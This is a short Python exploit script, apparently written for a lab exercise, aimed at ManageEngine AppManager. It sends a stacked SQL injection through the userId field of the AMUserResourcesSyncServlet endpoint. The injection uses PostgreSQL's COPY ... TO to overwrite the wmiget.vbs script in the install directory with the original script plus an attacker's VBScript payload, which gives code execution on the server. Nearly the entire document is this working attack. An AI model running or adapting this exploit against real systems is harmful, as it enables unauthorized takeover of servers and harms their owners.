import httpx
import base64

proxy = {
        "http://": "http://localhost:8080",
        "https://": "http://localhost:8080",
}

client = httpx.Client(
        verify=False,
        timeout=10.0,
        proxies=proxy,
)

IP = "192.168.218.113"
PORT = "8443"
URL = f"https://{IP}:{PORT}/servlet/AMUserResourcesSyncServlet"

original = base64.b64encode(open("./wmiget.vbs","r").read()
                            .replace("\n", ":")
                            .replace("\t", "").encode()).decode()
payload = base64.b64encode(open("./payload.vbs","r").read().replace("\n", "").encode()).decode()
save_path = "C:\\\\Program Files (x86)\\\\ManageEngine\\\\AppManager12\\\\working\\\\conf\\\\application\\\\scripts\\\\wmiget.vbs"
exploit = f";COPY (SELECT convert_from(decode($${original}{payload}$$, $$base64$$),$$utf-8$$)) to $${save_path}$$;--+"

print(exploit)
res = client.post(f"{URL}", data={"ForMasRange":"1","userId":f"1{exploit}"})

print(res.status_code)
